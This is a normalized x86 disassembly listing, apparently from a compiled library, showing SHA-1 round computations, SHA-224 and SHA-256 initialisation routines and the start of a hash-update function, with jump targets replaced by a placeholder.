xor edi ebp
mov ebp [ esp + 0x3c ]
xor edi ebp
mov ebp [ esp + 0x24 ]
xor edi ebp
mov [ esp + 0x20 ] esi
mov [ esp + 0x1c ] ebx
rol edi 0x1
mov ebp esi
mov esi [ esp + 0x14 ]
rol ebp 0x5
mov [ esp + 0x5c ] ebp
mov ebp [ esp + 0x68 ]
xor ebp ebx
mov ebx [ esp + 0x5c ]
xor ebp esi
mov esi [ esp + 0x10 ]
add esi ebx
mov ebx [ esp + 0x44 ]
add ebp esi
mov esi [ esp + 0x14 ]
rol esi 0x1e
mov [ esp + 0x3c ] edi
lea edi [ edi + ebp + 0x6ed9eba1 ]
mov ebp [ esp + 0x28 ]
mov [ esp + 0x14 ] esi
mov esi edx
mov [ esp + 0x18 ] edi
xor esi ebp
mov ebp [ esp + 0x2c ]
xor esi ebx
mov ebx edi
mov edi [ esp + 0x1c ]
xor esi ebp
mov ebp [ esp + 0x20 ]
xor ebp edi
mov edi [ esp + 0x14 ]
rol esi 0x1
xor ebp edi
mov edi [ esp + 0x68 ]
rol ebx 0x5
add edi ebx
mov [ esp + 0x44 ] esi
add ebp edi
mov edi [ esp + 0x20 ]
rol edi 0x1e
lea esi [ esi + ebp + 0x6ed9eba1 ]
mov ebp [ esp + 0x30 ]
mov ebx edi
mov edi ecx
xor edi ebp
mov ebp [ esp + 0x48 ]
xor edi ebp
mov ebp [ esp + 0x34 ]
xor edi ebp
mov [ esp + 0x10 ] esi
mov ebp esi
mov esi [ esp + 0x18 ]
mov [ esp + 0x20 ] ebx
xor ebx esi
mov esi [ esp + 0x14 ]
rol edi 0x1
xor ebx esi
mov esi [ esp + 0x1c ]
rol ebp 0x5
add esi ebp
mov ebp [ esp + 0x28 ]
add ebx esi
mov esi [ esp + 0x18 ]
mov [ esp + 0x48 ] edi
rol esi 0x1e
lea edi [ edi + ebx + 0x6ed9eba1 ]
mov ebx esi
mov esi [ esp + 0x38 ]
mov [ esp + 0x68 ] edi
xor esi ebp
mov ebp [ esp + 0x3c ]
xor esi ebp
mov ebp [ esp + 0x50 ]
xor esi ebp
mov ebp ebx
rol esi 0x1
mov [ esp + 0x1c ] esi
mov [ esp + 0x28 ] esi
mov esi [ esp + 0x10 ]
mov [ esp + 0x18 ] ebx
or ebp esi
rol edi 0x5
and ebp [ esp + 0x20 ]
and ebx esi
or ebp ebx
mov ebx [ esp + 0x14 ]
add ebp ebx
mov ebx [ esp + 0x1c ]
add ebp ebx
rol esi 0x1e
lea ebx [ edi + ebp - 0x70e44324 ]
mov ebp [ esp + 0x30 ]
mov edi esi
mov esi [ esp + 0x40 ]
xor esi ebp
mov ebp [ esp + 0x44 ]
xor esi ebp
mov ebp [ esp + 0x4c ]
xor esi ebp
mov ebp edi
rol esi 0x1
mov [ esp + 0x14 ] esi
mov [ esp + 0x30 ] esi
mov esi [ esp + 0x68 ]
mov [ esp + 0x10 ] edi
or ebp esi
and edi esi
and ebp [ esp + 0x18 ]
mov [ esp + 0x1c ] ebx
rol ebx 0x5
or ebp edi
mov edi [ esp + 0x20 ]
add ebp edi
mov edi [ esp + 0x14 ]
add ebp edi
rol esi 0x1e
lea ebx [ ebx + ebp - 0x70e44324 ]
mov ebp [ esp + 0x38 ]
mov edi esi
mov esi [ esp + 0x58 ]
xor esi ebp
mov ebp [ esp + 0x48 ]
xor esi ebp
mov ebp [ esp + 0x24 ]
xor esi ebp
mov ebp edi
rol esi 0x1
mov [ esp + 0x20 ] esi
mov [ esp + 0x38 ] esi
mov esi [ esp + 0x1c ]
mov [ esp + 0x68 ] edi
or ebp esi
and edi esi
and ebp [ esp + 0x10 ]
mov [ esp + 0x14 ] ebx
rol ebx 0x5
or ebp edi
mov edi [ esp + 0x18 ]
add ebp edi
mov edi [ esp + 0x20 ]
add ebp edi
rol esi 0x1e
lea ebx [ ebx + ebp - 0x70e44324 ]
mov ebp [ esp + 0x40 ]
mov edi esi
mov esi [ esp + 0x54 ]
xor esi ebp
mov ebp [ esp + 0x28 ]
xor esi ebp
mov ebp [ esp + 0x2c ]
xor esi ebp
mov ebp edi
rol esi 0x1
mov [ esp + 0x18 ] esi
mov [ esp + 0x40 ] esi
mov esi [ esp + 0x14 ]
mov [ esp + 0x1c ] edi
or ebp esi
mov [ esp + 0x20 ] ebx
and ebp [ esp + 0x68 ]
and edi esi
rol ebx 0x5
or ebp edi
mov edi [ esp + 0x10 ]
add ebp edi
mov edi [ esp + 0x18 ]
add ebp edi
rol esi 0x1e
lea ebx [ ebx + ebp - 0x70e44324 ]
mov ebp [ esp + 0x58 ]
mov edi esi
mov esi edx
xor esi ebp
mov ebp [ esp + 0x30 ]
xor esi ebp
mov ebp [ esp + 0x34 ]
xor esi ebp
mov [ esp + 0x14 ] edi
rol esi 0x1
mov [ esp + 0x10 ] esi
mov [ esp + 0x58 ] esi
mov esi [ esp + 0x20 ]
mov [ esp + 0x18 ] ebx
mov ebp esi
and esi edi
or ebp edi
mov edi [ esp + 0x68 ]
and ebp [ esp + 0x1c ]
rol ebx 0x5
or ebp esi
mov esi [ esp + 0x10 ]
add ebp edi
add ebp esi
mov esi [ esp + 0x20 ]
rol esi 0x1e
lea ebx [ ebx + ebp - 0x70e44324 ]
mov ebp [ esp + 0x54 ]
mov edi esi
mov esi ecx
xor esi ebp
mov ebp [ esp + 0x38 ]
xor esi ebp
mov ebp [ esp + 0x3c ]
xor esi ebp
mov ebp edi
rol esi 0x1
mov [ esp + 0x68 ] esi
mov [ esp + 0x54 ] esi
mov esi [ esp + 0x18 ]
mov [ esp + 0x20 ] edi
or ebp esi
and edi esi
and ebp [ esp + 0x14 ]
mov [ esp + 0x10 ] ebx
rol ebx 0x5
or ebp edi
mov edi [ esp + 0x1c ]
add ebp edi
mov edi [ esp + 0x68 ]
add ebp edi
rol esi 0x1e
lea ebx [ ebx + ebp - 0x70e44324 ]
mov ebp [ esp + 0x40 ]
mov edi esi
mov esi [ esp + 0x44 ]
xor edx ebp
mov ebp [ esp + 0x50 ]
xor edx esi
mov [ esp + 0x18 ] edi
xor edx ebp
mov ebp edi
rol edx 0x1
mov [ esp + 0x1c ] edx
mov esi edx
mov edx [ esp + 0x10 ]
mov [ esp + 0x68 ] ebx
or ebp edx
and edi edx
and ebp [ esp + 0x20 ]
rol ebx 0x5
or ebp edi
mov edi [ esp + 0x14 ]
add ebp edi
mov edi esi
add ebp edi
lea ebx [ ebx + ebp - 0x70e44324 ]
mov ebp [ esp + 0x58 ]
rol edx 0x1e
mov edi edx
mov edx [ esp + 0x48 ]
xor ecx ebp
mov ebp [ esp + 0x4c ]
xor ecx edx
mov edx [ esp + 0x68 ]
xor ecx ebp
mov ebp [ esp + 0x18 ]
rol ecx 0x1
mov [ esp + 0x14 ] ecx
mov [ esp + 0x5c ] ecx
mov ecx edi
mov [ esp + 0x1c ] ebx
or ecx edx
mov [ esp + 0x10 ] edi
and ecx ebp
mov ebp edi
and ebp edx
or ecx ebp
mov ebp [ esp + 0x20 ]
add ecx ebp
mov ebp [ esp + 0x14 ]
rol ebx 0x5
add ecx ebp
mov ebp [ esp + 0x28 ]
rol edx 0x1e
lea ebx [ ecx + ebx - 0x70e44324 ]
mov ecx [ esp + 0x54 ]
xor ecx ebp
mov ebp [ esp + 0x24 ]
xor ecx ebp
mov ebp [ esp + 0x50 ]
xor ecx ebp
mov ebp [ esp + 0x1c ]
mov [ esp + 0x68 ] edx
or edx ebp
and edx edi
mov edi [ esp + 0x68 ]
and edi ebp
mov [ esp + 0x14 ] ebx
or edx edi
mov edi [ esp + 0x18 ]
rol ecx 0x1
add edx edi
mov [ esp + 0x50 ] ecx
rol ebx 0x5
add edx ecx
mov ecx ebp
mov ebp [ esp + 0x30 ]
mov edi esi
lea edx [ edx + ebx - 0x70e44324 ]
mov ebx [ esp + 0x2c ]
xor edi ebp
mov ebp [ esp + 0x4c ]
xor edi ebx
mov ebx edx
rol ecx 0x1e
xor edi ebp
mov ebp [ esp + 0x14 ]
mov [ esp + 0x1c ] ecx
or ecx ebp
mov ebp [ esp + 0x68 ]
and ecx ebp
mov ebp [ esp + 0x1c ]
and ebp [ esp + 0x14 ]
rol edi 0x1
or ecx ebp
mov ebp [ esp + 0x10 ]
add ecx ebp
mov [ esp + 0x4c ] edi
rol ebx 0x5
add ecx edi
lea edi [ ecx + ebx - 0x70e44324 ]
mov ecx [ esp + 0x14 ]
mov ebx [ esp + 0x5c ]
mov [ esp + 0x18 ] edi
rol ecx 0x1e
mov [ esp + 0x14 ] ecx
mov ebp [ esp + 0x38 ]
xor ebx ebp
mov ebp [ esp + 0x34 ]
xor ebx ebp
mov ebp [ esp + 0x24 ]
xor ebx ebp
mov ebp edx
or ebp ecx
mov ecx [ esp + 0x1c ]
and ebp ecx
mov ecx edx
and ecx [ esp + 0x14 ]
rol ebx 0x1
or ebp ecx
mov ecx [ esp + 0x68 ]
add ebp ecx
mov [ esp + 0x24 ] ebx
add ebp ebx
mov ebx [ esp + 0x3c ]
rol edi 0x5
rol edx 0x1e
mov ecx edx
mov edx [ esp + 0x40 ]
lea edi [ edi + ebp - 0x70e44324 ]
mov ebp [ esp + 0x2c ]
xor edx ebx
mov ebx [ esp + 0x50 ]
xor edx ebp
mov ebp [ esp + 0x18 ]
xor edx ebx
mov ebx ecx
or ebx ebp
mov ebp [ esp + 0x14 ]
and ebx ebp
mov ebp ecx
and ebp [ esp + 0x18 ]
mov [ esp + 0x10 ] edi
rol edx 0x1
or ebx ebp
mov ebp [ esp + 0x1c ]
add ebx ebp
mov ebp [ esp + 0x44 ]
mov [ esp + 0x2c ] edx
add ebx edx
mov edx [ esp + 0x18 ]
rol edi 0x5
rol edx 0x1e
lea edi [ ebx + edi - 0x70e44324 ]
mov ebx edx
mov edx [ esp + 0x58 ]
mov [ esp + 0x18 ] ebx
xor edx ebp
mov ebp [ esp + 0x34 ]
xor edx ebp
mov ebp [ esp + 0x4c ]
xor edx ebp
mov ebp [ esp + 0x10 ]
or ebx ebp
mov ebp [ esp + 0x18 ]
and ebp [ esp + 0x10 ]
and ebx ecx
rol edx 0x1
or ebx ebp
mov ebp [ esp + 0x14 ]
add ebx ebp
mov ebp [ esp + 0x48 ]
mov [ esp + 0x68 ] edi
mov [ esp + 0x34 ] edx
add ebx edx
mov edx [ esp + 0x10 ]
rol edi 0x5
rol edx 0x1e
lea edi [ ebx + edi - 0x70e44324 ]
mov ebx edx
mov edx [ esp + 0x54 ]
mov [ esp + 0x1c ] edi
xor edx ebp
mov ebp [ esp + 0x3c ]
xor edx ebp
mov ebp [ esp + 0x24 ]
mov [ esp + 0x10 ] ebx
xor edx ebp
mov ebp [ esp + 0x68 ]
or ebx ebp
mov ebp [ esp + 0x18 ]
and ebx ebp
mov ebp [ esp + 0x10 ]
and ebp [ esp + 0x68 ]
rol edx 0x1
or ebx ebp
mov ebp [ esp + 0x28 ]
add ebx ecx
mov ecx [ esp + 0x68 ]
add ebx edx
mov [ esp + 0x3c ] edx
rol edi 0x5
mov edx esi
lea edi [ ebx + edi - 0x70e44324 ]
mov ebx [ esp + 0x44 ]
xor edx ebp
mov ebp [ esp + 0x2c ]
xor edx ebx
mov ebx edi
rol ecx 0x1e
xor edx ebp
mov ebp ecx
or ebp [ esp + 0x1c ]
mov [ esp + 0x68 ] ecx
and ecx [ esp + 0x1c ]
mov [ esp + 0x14 ] edi
and ebp [ esp + 0x10 ]
rol edx 0x1
or ebp ecx
mov ecx [ esp + 0x18 ]
add ebp ecx
mov [ esp + 0x44 ] edx
add ebp edx
mov edx [ esp + 0x1c ]
rol ebx 0x5
rol edx 0x1e
lea ecx [ ebx + ebp - 0x70e44324 ]
mov ebp [ esp + 0x30 ]
mov ebx edx
mov edx [ esp + 0x5c ]
mov [ esp + 0x1c ] ebx
or ebx edi
mov edi [ esp + 0x68 ]
xor edx ebp
mov ebp [ esp + 0x48 ]
and ebx edi
mov edi [ esp + 0x1c ]
xor edx ebp
and edi [ esp + 0x14 ]
mov ebp [ esp + 0x34 ]
xor edx ebp
mov ebp ecx
or ebx edi
mov edi [ esp + 0x10 ]
rol edx 0x1
add ebx edi
mov [ esp + 0x48 ] edx
add ebx edx
mov edx [ esp + 0x14 ]
rol ebp 0x5
rol edx 0x1e
lea edi [ ebx + ebp - 0x70e44324 ]
mov ebp [ esp + 0x28 ]
mov ebx edx
mov edx [ esp + 0x38 ]
xor edx ebp
mov ebp [ esp + 0x3c ]
xor edx ebp
mov ebp [ esp + 0x50 ]
xor edx ebp
mov [ esp + 0x18 ] edi
rol edx 0x1
mov ebp ecx
mov [ esp + 0x14 ] ebx
rol edi 0x5
or ebp ebx
mov ebx [ esp + 0x1c ]
mov [ esp + 0x28 ] edx
and ebp ebx
mov ebx ecx
and ebx [ esp + 0x14 ]
or ebp ebx
mov ebx [ esp + 0x68 ]
add ebp ebx
mov ebx [ esp + 0x30 ]
add ebp edx
rol ecx 0x1e
mov edx ecx
mov ecx [ esp + 0x40 ]
lea edi [ edi + ebp - 0x70e44324 ]
mov ebp [ esp + 0x44 ]
xor ecx ebx
mov ebx [ esp + 0x4c ]
xor ecx ebp
mov ebp [ esp + 0x18 ]
xor ecx ebx
mov ebx edx
or ebx ebp
mov ebp [ esp + 0x14 ]
and ebx ebp
mov ebp edx
and ebp [ esp + 0x18 ]
mov [ esp + 0x10 ] edi
rol ecx 0x1
or ebx ebp
mov ebp [ esp + 0x1c ]
add ebx ebp
mov ebp [ esp + 0x38 ]
mov [ esp + 0x30 ] ecx
add ebx ecx
mov ecx [ esp + 0x18 ]
mov [ esp + 0x20 ] edx
rol edi 0x5
rol ecx 0x1e
lea edi [ ebx + edi - 0x70e44324 ]
mov ebx ecx
mov ecx [ esp + 0x58 ]
mov [ esp + 0x18 ] ebx
xor ecx ebp
mov ebp [ esp + 0x48 ]
xor ecx ebp
mov ebp [ esp + 0x24 ]
xor ecx ebp
mov ebp [ esp + 0x10 ]
or ebx ebp
mov [ esp + 0x68 ] edi
and ebx edx
mov edx [ esp + 0x18 ]
and edx ebp
or ebx edx
mov edx [ esp + 0x14 ]
rol ecx 0x1
add ebx edx
mov [ esp + 0x38 ] ecx
add ebx ecx
mov ecx ebp
mov ebp [ esp + 0x40 ]
rol edi 0x5
rol ecx 0x1e
lea edx [ ebx + edi - 0x70e44324 ]
mov ebx [ esp + 0x28 ]
mov edi ecx
mov ecx [ esp + 0x54 ]
xor ecx ebp
mov ebp [ esp + 0x2c ]
xor ecx ebx
mov [ esp + 0x10 ] edi
xor ecx ebp
mov ebp [ esp + 0x68 ]
or edi ebp
mov ebp [ esp + 0x18 ]
and edi ebp
mov ebp [ esp + 0x10 ]
and ebp [ esp + 0x68 ]
mov ebx edx
rol ecx 0x1
rol ebx 0x5
mov [ esp + 0x40 ] ecx
or edi ebp
mov ebp [ esp + 0x20 ]
add edi ebp
mov ebp [ esp + 0x58 ]
add edi ecx
mov ecx [ esp + 0x68 ]
rol ecx 0x1e
lea ebx [ edi + ebx - 0x70e44324 ]
mov edi ecx
mov ecx esi
mov [ esp + 0x14 ] ebx
xor ecx ebp
mov ebp [ esp + 0x30 ]
xor ecx ebp
mov ebp [ esp + 0x34 ]
xor ecx ebp
mov ebp [ esp + 0x10 ]
xor ebp edi
mov [ esp + 0x68 ] edi
mov edi [ esp + 0x18 ]
xor ebp edx
rol ecx 0x1
rol ebx 0x5
add ebp ecx
add ebx edi
rol edx 0x1e
lea edi [ ebx + ebp - 0x359d3e2a ]
mov ebp [ esp + 0x54 ]
mov ebx edx
mov edx [ esp + 0x5c ]
xor edx ebp
mov ebp [ esp + 0x38 ]
xor edx ebp
mov ebp [ esp + 0x3c ]
xor edx ebp
mov ebp [ esp + 0x68 ]
mov [ esp + 0x1c ] ebx
xor ebp ebx
mov ebx [ esp + 0x14 ]
mov [ esp + 0x20 ] edi
rol edx 0x1
xor ebp ebx
mov ebx [ esp + 0x10 ]
rol edi 0x5
add ebp edx
add edi ebx
lea ebx [ edi + ebp - 0x359d3e2a ]
mov edi [ esp + 0x14 ]
mov ebp [ esp + 0x44 ]
mov [ esp + 0x18 ] ebx
rol edi 0x1e
mov [ esp + 0x14 ] edi
mov edi [ esp + 0x40 ]
xor esi edi
mov edi [ esp + 0x50 ]
xor esi ebp
mov ebp [ esp + 0x1c ]
xor esi edi
mov edi [ esp + 0x20 ]
xor edi ebp
mov ebp [ esp + 0x14 ]
rol esi 0x1
xor edi ebp
mov ebp [ esp + 0x68 ]
rol ebx 0x5
add edi esi
add ebx ebp
lea ebx [ edi + ebx - 0x359d3e2a ]
mov edi [ esp + 0x20 ]
rol edi 0x1e
mov ebp edi
mov edi [ esp + 0x5c ]
xor edi ecx
mov [ esp + 0x10 ] ebx
xor edi [ esp + 0x48 ]
mov [ esp + 0x20 ] ebp
xor edi [ esp + 0x4c ]
rol edi 0x1
mov [ esp + 0x5c ] edi
mov edi [ esp + 0x18 ]
rol ebx 0x5
xor ebp edi
mov edi [ esp + 0x14 ]
xor ebp edi
mov edi [ esp + 0x5c ]
add ebp edi
mov edi [ esp + 0x1c ]
add ebx edi
mov edi [ esp + 0x18 ]
rol edi 0x1e
lea ebx [ ebx + ebp - 0x359d3e2a ]
mov ebp edi
mov edi edx
mov [ esp + 0x18 ] ebp
xor edi [ esp + 0x28 ]
mov [ esp + 0x68 ] ebx
xor edi [ esp + 0x24 ]
xor edi [ esp + 0x50 ]
rol edi 0x1
mov [ esp + 0x50 ] edi
mov edi [ esp + 0x20 ]
xor edi ebp
mov ebp [ esp + 0x10 ]
xor edi ebp
mov ebp [ esp + 0x50 ]
add edi ebp
mov ebp [ esp + 0x14 ]
rol ebx 0x5
add ebx ebp
lea ebx [ edi + ebx - 0x359d3e2a ]
mov edi [ esp + 0x10 ]
rol edi 0x1e
mov ebp edi
mov edi esi
xor edi [ esp + 0x30 ]
mov [ esp + 0x10 ] ebp
mov [ esp + 0x1c ] ebx
xor edi [ esp + 0x2c ]
xor edi [ esp + 0x4c ]
rol edi 0x1
mov [ esp + 0x4c ] edi
mov edi [ esp + 0x18 ]
xor edi ebp
mov ebp [ esp + 0x68 ]
xor edi ebp
mov ebp [ esp + 0x20 ]
add edi ebp
mov ebp [ esp + 0x4c ]
rol ebx 0x5
add ebx ebp
lea ebx [ edi + ebx - 0x359d3e2a ]
mov edi [ esp + 0x68 ]
rol edi 0x1e
mov ebp edi
mov edi [ esp + 0x5c ]
xor edi [ esp + 0x38 ]
mov [ esp + 0x68 ] ebp
mov [ esp + 0x14 ] ebx
xor edi [ esp + 0x34 ]
xor edi [ esp + 0x24 ]
rol edi 0x1
mov [ esp + 0x24 ] edi
mov edi [ esp + 0x10 ]
xor edi ebp
mov ebp [ esp + 0x1c ]
xor edi ebp
mov ebp [ esp + 0x24 ]
add edi ebp
mov ebp [ esp + 0x18 ]
rol ebx 0x5
add ebx ebp
lea ebx [ edi + ebx - 0x359d3e2a ]
mov edi [ esp + 0x1c ]
rol edi 0x1e
mov ebp edi
mov edi [ esp + 0x40 ]
xor edi [ esp + 0x3c ]
mov [ esp + 0x20 ] ebx
mov [ esp + 0x1c ] ebp
xor edi [ esp + 0x2c ]
xor edi [ esp + 0x50 ]
rol edi 0x1
mov [ esp + 0x2c ] edi
mov edi [ esp + 0x68 ]
xor edi ebp
mov ebp [ esp + 0x14 ]
xor edi ebp
mov ebp [ esp + 0x2c ]
add edi ebp
mov ebp [ esp + 0x10 ]
rol ebx 0x5
add ebx ebp
mov ebp [ esp + 0x44 ]
lea ebx [ edi + ebx - 0x359d3e2a ]
mov edi [ esp + 0x14 ]
rol edi 0x1e
mov [ esp + 0x14 ] edi
mov edi ecx
xor edi ebp
mov ebp [ esp + 0x34 ]
xor edi ebp
mov ebp [ esp + 0x4c ]
xor edi ebp
mov ebp [ esp + 0x1c ]
rol edi 0x1
mov [ esp + 0x34 ] edi
mov edi [ esp + 0x20 ]
xor edi ebp
mov ebp [ esp + 0x14 ]
xor edi ebp
mov ebp [ esp + 0x34 ]
add edi ebp
mov ebp [ esp + 0x68 ]
mov [ esp + 0x18 ] ebx
rol ebx 0x5
add ebx ebp
lea ebx [ edi + ebx - 0x359d3e2a ]
mov edi [ esp + 0x20 ]
rol edi 0x1e
mov ebp edi
mov edi edx
xor edi [ esp + 0x48 ]
mov [ esp + 0x20 ] ebp
mov [ esp + 0x10 ] ebx
xor edi [ esp + 0x3c ]
xor edi [ esp + 0x24 ]
rol edi 0x1
mov [ esp + 0x3c ] edi
mov edi [ esp + 0x18 ]
xor ebp edi
mov edi [ esp + 0x14 ]
xor ebp edi
mov edi [ esp + 0x3c ]
add ebp edi
mov edi [ esp + 0x1c ]
rol ebx 0x5
add ebx edi
mov edi [ esp + 0x18 ]
rol edi 0x1e
lea ebx [ ebx + ebp - 0x359d3e2a ]
mov ebp edi
mov edi esi
mov [ esp + 0x18 ] ebp
xor edi [ esp + 0x28 ]
mov [ esp + 0x68 ] ebx
xor edi [ esp + 0x44 ]
xor edi [ esp + 0x2c ]
rol edi 0x1
mov [ esp + 0x44 ] edi
mov edi [ esp + 0x20 ]
xor edi ebp
mov ebp [ esp + 0x10 ]
xor edi ebp
mov ebp [ esp + 0x44 ]
add edi ebp
mov ebp [ esp + 0x14 ]
rol ebx 0x5
add ebx ebp
lea ebx [ edi + ebx - 0x359d3e2a ]
mov edi [ esp + 0x10 ]
rol edi 0x1e
mov ebp edi
mov [ esp + 0x1c ] ebx
mov [ esp + 0x10 ] ebp
mov edi [ esp + 0x5c ]
xor edi [ esp + 0x30 ]
xor edi [ esp + 0x48 ]
xor edi [ esp + 0x34 ]
rol edi 0x1
mov [ esp + 0x48 ] edi
mov edi [ esp + 0x18 ]
xor edi ebp
mov ebp [ esp + 0x68 ]
xor edi ebp
mov ebp [ esp + 0x48 ]
add edi ebp
mov ebp [ esp + 0x20 ]
rol ebx 0x5
add ebx ebp
lea ebx [ edi + ebx - 0x359d3e2a ]
mov edi [ esp + 0x68 ]
rol edi 0x1e
mov ebp edi
mov edi [ esp + 0x38 ]
xor edi [ esp + 0x28 ]
mov [ esp + 0x68 ] ebp
mov [ esp + 0x14 ] ebx
xor edi [ esp + 0x3c ]
xor edi [ esp + 0x50 ]
rol edi 0x1
mov [ esp + 0x28 ] edi
mov edi [ esp + 0x10 ]
xor edi ebp
mov ebp [ esp + 0x1c ]
xor edi ebp
mov ebp [ esp + 0x28 ]
add edi ebp
mov ebp [ esp + 0x18 ]
rol ebx 0x5
add ebx ebp
lea ebx [ edi + ebx - 0x359d3e2a ]
mov edi [ esp + 0x1c ]
rol edi 0x1e
mov ebp edi
mov edi [ esp + 0x40 ]
xor edi [ esp + 0x30 ]
mov [ esp + 0x1c ] ebp
mov [ esp + 0x20 ] ebx
xor edi [ esp + 0x44 ]
xor edi [ esp + 0x4c ]
rol edi 0x1
mov [ esp + 0x30 ] edi
mov edi [ esp + 0x68 ]
xor edi ebp
mov ebp [ esp + 0x14 ]
xor edi ebp
mov ebp [ esp + 0x30 ]
add edi ebp
mov ebp [ esp + 0x10 ]
rol ebx 0x5
add ebx ebp
mov ebp [ esp + 0x38 ]
lea ebx [ edi + ebx - 0x359d3e2a ]
mov edi [ esp + 0x14 ]
rol edi 0x1e
mov [ esp + 0x14 ] edi
mov edi ecx
xor edi ebp
mov ebp [ esp + 0x48 ]
xor edi ebp
mov ebp [ esp + 0x24 ]
xor edi ebp
mov ebp [ esp + 0x1c ]
rol edi 0x1
mov [ esp + 0x38 ] edi
mov edi [ esp + 0x20 ]
xor edi ebp
mov ebp [ esp + 0x14 ]
xor edi ebp
mov ebp [ esp + 0x38 ]
mov [ esp + 0x18 ] ebx
add edi ebp
mov ebp [ esp + 0x68 ]
rol ebx 0x5
add ebx ebp
lea ebx [ edi + ebx - 0x359d3e2a ]
mov edi [ esp + 0x20 ]
rol edi 0x1e
mov ebp edi
mov edi edx
xor edi [ esp + 0x40 ]
mov [ esp + 0x20 ] ebp
mov [ esp + 0x10 ] ebx
xor edi [ esp + 0x28 ]
xor edi [ esp + 0x2c ]
rol edi 0x1
mov [ esp + 0x40 ] edi
mov edi [ esp + 0x18 ]
xor ebp edi
mov edi [ esp + 0x14 ]
xor ebp edi
mov edi [ esp + 0x40 ]
add ebp edi
mov edi [ esp + 0x1c ]
rol ebx 0x5
add ebx edi
mov edi [ esp + 0x18 ]
rol edi 0x1e
lea ebx [ ebx + ebp - 0x359d3e2a ]
mov ebp edi
mov edi esi
mov [ esp + 0x68 ] ebx
xor edi ecx
mov ecx [ esp + 0x30 ]
xor edi ecx
mov ecx [ esp + 0x34 ]
xor edi ecx
mov ecx [ esp + 0x10 ]
rol edi 0x1
rol ebx 0x5
mov [ esp + 0x58 ] ebx
mov ebx [ esp + 0x20 ]
xor ebx ebp
mov [ esp + 0x18 ] ebp
mov ebp [ esp + 0x58 ]
xor ebx ecx
add ebp [ esp + 0x14 ]
add ebx edi
rol ecx 0x1e
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x5c ]
lea ebx [ ebx + ebp - 0x359d3e2a ]
mov ebp ecx
xor ebp edx
mov edx [ esp + 0x38 ]
xor ebp edx
mov edx [ esp + 0x3c ]
xor ebp edx
mov edx [ esp + 0x20 ]
rol ebp 0x1
add edx ebp
mov ebp [ esp + 0x10 ]
mov [ esp + 0x5c ] edx
mov edx [ esp + 0x18 ]
xor edx ebp
mov ebp [ esp + 0x68 ]
mov [ esp + 0x1c ] ebx
xor edx ebp
mov ebp [ esp + 0x5c ]
rol ebx 0x5
add ebx ebp
mov ebp [ esp + 0x40 ]
xor esi ebp
mov ebp [ esp + 0x50 ]
lea edx [ edx + ebx - 0x359d3e2a ]
mov ebx [ esp + 0x68 ]
rol ebx 0x1e
mov [ esp + 0x68 ] ebx
mov ebx [ esp + 0x44 ]
xor esi ebx
mov ebx edx
xor esi ebp
mov ebp [ esp + 0x18 ]
rol esi 0x1
rol ebx 0x5
add ebp esi
mov esi [ esp + 0x10 ]
mov [ esp + 0x5c ] ebp
mov ebp [ esp + 0x68 ]
xor ecx edi
xor esi ebp
mov ebp [ esp + 0x1c ]
xor esi ebp
mov ebp [ esp + 0x5c ]
mov edi [ esp + 0x48 ]
add ebx ebp
xor ecx edi
mov edi [ esp + 0x10 ]
lea ebx [ esi + ebx - 0x359d3e2a ]
mov esi [ esp + 0x1c ]
rol esi 0x1e
mov [ esp + 0x1c ] esi
mov esi [ esp + 0x4c ]
xor ecx esi
mov esi [ esp + 0x68 ]
rol ecx 0x1
add edi ecx
mov ecx esi
xor ecx [ esp + 0x1c ]
mov ebp ebx
rol ebp 0x5
xor ecx edx
add ebp edi
lea edi [ ecx + ebp - 0x359d3e2a ]
mov ecx [ esp + 0x64 ]
mov ebp [ ecx ]
add ebp edi
mov edi [ ecx + 0x4 ]
add edi ebx
mov ebx [ ecx + 0x8 ]
rol edx 0x1e
add edx ebx
mov ebx [ esp + 0x1c ]
mov [ ecx + 0x8 ] edx
mov edx [ ecx + 0xc ]
add edx ebx
mov [ ecx ] ebp
mov [ ecx + 0xc ] edx
mov edx [ ecx + 0x10 ]
add edx esi
mov [ ecx + 0x4 ] edi
mov [ ecx + 0x10 ] edx
mov edx [ esp + 0x6c ]
dec edx
mov [ esp + 0x6c ] edx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn
sub_1003b0e0
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax ] 0xc1059ed8
mov [ eax + 0x4 ] 0x367cd507
mov [ eax + 0x8 ] 0x3070dd17
mov [ eax + 0xc ] 0xf70e5939
mov [ eax + 0x10 ] 0xffc00b31
mov [ eax + 0x14 ] 0x68581511
mov [ eax + 0x18 ] 0x64f98fa7
mov [ eax + 0x1c ] 0xbefa4fa4
mov [ eax + 0x20 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x68 ] ecx
mov [ eax + 0x6c ] 0x1c
mov eax 0x1
retn
sub_1003b140
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax ] 0x6a09e667
mov [ eax + 0x4 ] 0xbb67ae85
mov [ eax + 0x8 ] 0x3c6ef372
mov [ eax + 0xc ] 0xa54ff53a
mov [ eax + 0x10 ] 0x510e527f
mov [ eax + 0x14 ] 0x9b05688c
mov [ eax + 0x18 ] 0x1f83d9ab
mov [ eax + 0x1c ] 0x5be0cd19
mov [ eax + 0x20 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x68 ] ecx
mov [ eax + 0x6c ] 0x20
mov eax 0x1
retn
sub_1003b1a0
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi [ esp + 0x14 ]
push edi
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov ebx [ esp + 0x14 ]
mov ecx [ ebx + 0x20 ]
lea eax [ ecx + ebp * 8 ]
cmp eax ecx
jae r-xdata
mov edx [ ebx + 0x24 ]
mov ecx ebp
shr ecx 0x1d
mov [ ebx + 0x20 ] eax
mov eax [ ebx + 0x68 ]
add edx ecx
test eax eax
mov [ ebx + 0x24 ] edx
je r-xdata
inc [ ebx + 0x24 ]
mov edi ebp
shr edi 0x6
je r-xdata
cmp ebp 0x40
lea edx [ ebx + 0x28 ]
jae r-xdata
test ebp ebp
je r-xdata
push edi
push esi
push ebx
call sub_1003b430
shl edi 0x6
add esp 0xc
add esi edi
sub ebp edi
mov ecx 0x40
lea edi [ edx + eax ]
sub ecx eax
push 0x1
mov [ esp + 0x20 ] ecx
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push edx
and ecx 0x3
push ebx
[ edi ] [ esi ]
call sub_1003b430
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
add esp 0xc
sub ebp eax
